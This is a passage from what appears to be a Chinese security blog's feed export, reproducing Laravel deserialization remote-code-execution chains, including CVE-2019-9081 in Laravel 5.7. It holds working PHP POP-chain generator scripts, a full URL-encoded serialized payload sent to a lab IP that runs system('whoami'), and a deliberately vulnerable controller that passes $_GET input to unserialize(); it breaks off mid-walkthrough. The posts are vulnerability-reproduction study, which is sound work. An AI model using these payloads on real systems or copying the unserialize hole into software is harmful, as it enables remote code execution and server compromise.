class="variable">$application</span> = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">        <span class="variable">$defaultGenerator</span>,</span><br><span class="line">        <span class="variable">$application</span>,</span><br><span class="line">        <span class="string">&quot;system&quot;</span>,</span><br><span class="line">        [<span class="string">&quot;whoami&quot;</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$validgenerator</span> = <span class="keyword">new</span> Faker\ValidGenerator(<span class="keyword">array</span>(<span class="variable">$pendingcommand</span>, <span class="string">&#x27;run&#x27;</span>));</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast(<span class="variable">$validgenerator</span>, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.136.167&#x2F;index.php&#x2F;user?user&#x3D;O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A20%3A%22Faker%5CValidGenerator%22%3A3%3A%7Bs%3A12%3A%22%00%2A%00generator%22%3BO%3A28%3A%22Illuminate%5CEvents%5CDispatcher%22%3A0%3A%7B%7Ds%3A12%3A%22%00%2A%00validator%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A2%3A%7Bi%3A0%3Bi%3A1%3Bi%3A1%3Bi%3A2%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7Ds%3A10%3A%22maxRetries%22%3Bi%3A10000%3B%7Ds%3A8%3A%22%00%2A%00event%22%3Bs%3A3%3A%22xxx%22%3B%7D</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇文章只是为了扩展一下自己，也遇到了很多问题，学习了其他师傅的文章，才写出来</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> 反序列化链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel5.7 反序列化 RCE复现</title>
      <link href="2021/04/12/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/04/12/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>这实际上是一个反序列化链，并不能直接命令执行，需要一个反序列化的点，这里直接给他捏一个</p><h3 id="CVE编号"><a href="#CVE编号" class="headerlink" title="CVE编号"></a>CVE编号</h3><p>CVE-2019-9081</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载一个 laravel5.7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;laravel&#x2F;laravel&#x2F;archive&#x2F;refs&#x2F;tags&#x2F;v5.7.0.zip</span><br></pre></td></tr></table></figure><p>解压缩，然后执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd laravel</span><br><span class="line">cp .env.example .env</span><br><span class="line">composer install</span><br><span class="line">php artisan key:generate</span><br></pre></td></tr></table></figure><p>然后添加代码，造一个反序列化入口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///var/www/laravel5.7/app/Http/Controllers/userController.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">userController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$user</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/var/www/laravel5.7/routes/web.php</span></span><br><span class="line">Route::get(<span class="string">&#x27;/user&#x27;</span>, <span class="string">&#x27;userController@index&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>漏洞出现在 PendingCommand.php 文件中，我们直接来到该文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vendor&#x2F;laravel&#x2F;framework&#x2F;src&#x2F;Illuminate&#x2F;Foundation&#x2F;Testing&#x2F;PendingCommand.php</span><br></pre></td></tr></table></figure><p>看到 __destruct() ，直接调用 $this-&gt;run()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;hasExecuted = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$exitCode</span> = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoMatchingExpectationException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$e</span>-&gt;getMethodName() === <span class="string">&#x27;askQuestion&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">&#x27;Unexpected question &quot;&#x27;</span>.<span class="variable">$e</span>-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion().<span class="string">&#x27;&quot; was asked.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="variable">$e</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>一眼看去，这里应该就是执行命令的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exitCode &#x3D; $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</span><br></pre></td></tr></table></figure><p>先随便写点东西调试一下，不知道用什么值就直接使用字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$test</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">pendingcommand</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>\<span class="title">PendingCommand</span>(</span><br><span class="line">        &quot;<span class="title">test</span>&quot;,</span><br><span class="line">        &quot;<span class="title">app</span>&quot;,</span><br><span class="line">        &quot;<span class="title">system</span>&quot;,</span><br><span class="line">        [&quot;<span class="title">whoami</span>&quot;]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成payload，丢入反序列化函数</p><h3 id="关键点1"><a href="#关键点1" class="headerlink" title="关键点1"></a>关键点1</h3><p>在 PendingCommand.php 的 $this-&gt;mockConsoleOutput(); 处下断点，在他的下一句也下断点，这时候发现不会执行到下一句，也就是说我们必须绕过这里，我们来看看这个函数的内部结构</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mockConsoleOutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mock</span> = Mockery::mock(OutputStyle::class.<span class="string">&#x27;[askQuestion]&#x27;</span>, [</span><br><span class="line">        (<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$question</span>) &#123;</span><br><span class="line">        <span class="variable">$mock</span>-&gt;shouldReceive(<span class="string">&#x27;askQuestion&#x27;</span>)</span><br><span class="line">            -&gt;once()</span><br><span class="line">            -&gt;ordered()</span><br><span class="line">            -&gt;with(Mockery::on(<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$argument</span></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$question</span></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$argument</span>-&gt;getQuestion() == <span class="variable">$question</span>[<span class="number">0</span>];</span><br><span class="line">            &#125;))</span><br><span class="line">            -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$question</span>, <span class="variable">$i</span></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions[<span class="variable">$i</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$question</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app-&gt;bind(OutputStyle::class, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$mock</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$mock</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后单步调试，进入 $this-&gt;createABufferedOutputMock()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">createABufferedOutputMock</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mock</span> = Mockery::mock(BufferedOutput::class.<span class="string">&#x27;[doWrite]&#x27;</span>)</span><br><span class="line">            -&gt;shouldAllowMockingProtectedMethods()</span><br><span class="line">            -&gt;shouldIgnoreMissing();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$output</span>) &#123;</span><br><span class="line">        <span class="variable">$mock</span>-&gt;shouldReceive(<span class="string">&#x27;doWrite&#x27;</span>)</span><br><span class="line">            -&gt;once()</span><br><span class="line">            -&gt;ordered()</span><br><span class="line">            -&gt;with(<span class="variable">$output</span>, Mockery::any())</span><br><span class="line">            -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$i</span></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput[<span class="variable">$i</span>]);</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mock</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到直接运行后发生的报错，就是在这个函数里面</p><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210416003329.png"></p><p>这里的意思是 $this-&gt;test 获取不到 expectedOutput，那这个好办，我们只要找到一个有 __get() 函数的类，赋值给 test 就可以绕过，直接搜索，搜索到的第一个就可以用</p><p>Faker\DefaultGenerator</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更改一下POC就可以绕过这一步</p><p>然后来到 180 行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;app-&gt;bind(OutputStyle::class, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$mock</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mock</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>由于我们的 $app 用的是个字符串，没有bind函数，所以会报错，因此需要找一个有 bind() 的类，这里可以用类中定义使用的 Illuminate\Foundation\Application</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$test</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span>&#123;</span><br><span class="line">    $<span class="title">defaultGenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>([1,2]);</span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">        <span class="variable">$defaultGenerator</span>,</span><br><span class="line">        <span class="variable">$application</span>,</span><br><span class="line">        <span class="string">&quot;system&quot;</span>,</span><br><span class="line">        [<span class="string">&quot;whoami&quot;</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="关键点2"><a href="#关键点2" class="headerlink" title="关键点2"></a>关键点2</h3><p>继续调试，进入这句代码，之后继续 F7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exitCode &#x3D; $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</span><br></pre></td></tr></table></figure><p>在这里会报错，让我们定位到报错的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">build</span>(<span class="params"><span class="variable">$concrete</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$concrete</span> <span class="keyword">instanceof</span> <span class="built_in">Closure</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$concrete</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;getLastParameterOverride());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$reflector</span> = <span class="keyword">new</span> ReflectionClass(<span class="variable">$concrete</span>);</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$reflector</span>-&gt;isInstantiable()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;notInstantiable(<span class="variable">$concrete</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>下面这个函数检测类是否可以实例化，而当前的 $concrete 值为 Illuminate\Contracts\Console\Kernel 是一个接口，自然就不能，就会进入下面，抛出异常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$reflector-&gt;isInstantiable()</span><br></pre></td></tr></table></figure><p>因此我们需要想办法改变 $concrete 的值为一个可以实例化的类，我们可以来看看怎么得到的 $concrete</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete &#x3D; $this-&gt;getConcrete($abstract);</span><br></pre></td></tr></table></figure><p>调试可以知道，$abstract 的值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Contracts\Console\Kernel</span><br></pre></td></tr></table></figure><p>我们来看 getConcrete 函数，在 Container.php 中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getConcrete</span>(<span class="params"><span class="variable">$abstract</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! is_null(<span class="variable">$concrete</span> = <span class="keyword">$this</span>-&gt;getContextualConcrete(<span class="variable">$abstract</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$concrete</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>][<span class="string">&#x27;concrete&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$abstract</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试可以知道，会一直向下走，直到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>])) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>][<span class="string">&#x27;concrete&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以通过反序列化控制 bindings 的值，因此可以达到更改返回值的目的，构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;bindings[<span class="string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>][<span class="string">&#x27;concrete&#x27;</span>] = <span class="string">&quot;Illuminate\Foundation\Application&quot;</span>;</span><br></pre></td></tr></table></figure><p>到了这里之后，我们再来调试，一直到</p><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210419211232.png"></p><p>此时的值为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$concrete</span> =&gt; Illuminate\Foundation\Application</span><br><span class="line"><span class="variable">$abstract</span> =&gt; Illuminate\Contracts\Console\Kernel</span><br></pre></td></tr></table></figure><p>进入 isBuildable 返回为 false，进入 make，当第二次来到上图位置时，此时值为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$concrete</span> =&gt; Illuminate\Foundation\Application</span><br><span class="line"><span class="variable">$abstract</span> =&gt; Illuminate\Foundation\Application</span><br></pre></td></tr></table></figure><p>可以进入 build 函数，过去之后就会进入 call</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"><span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$parameters</span> = [], <span class="variable">$defaultMethod</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> BoundMethod::call(<span class="keyword">$this</span>, <span class="variable">$callback</span>, <span class="variable">$parameters</span>, <span class="variable">$defaultMethod</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 此时值为</p><figure class="highlight php"><table><tr><td 